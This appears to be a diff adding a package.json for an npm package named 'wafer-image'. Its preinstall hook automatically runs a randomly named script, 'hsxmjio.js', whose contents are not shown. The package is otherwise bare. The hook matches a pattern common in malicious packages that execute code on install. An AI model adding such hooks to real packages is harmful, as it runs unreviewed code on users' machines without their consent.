@@ -1,0 +1,11 @@
+{
+  "name": "wafer-image",
+  "version": "1.2.2",
+  "main": "hsxmjio.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node hsxmjio.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
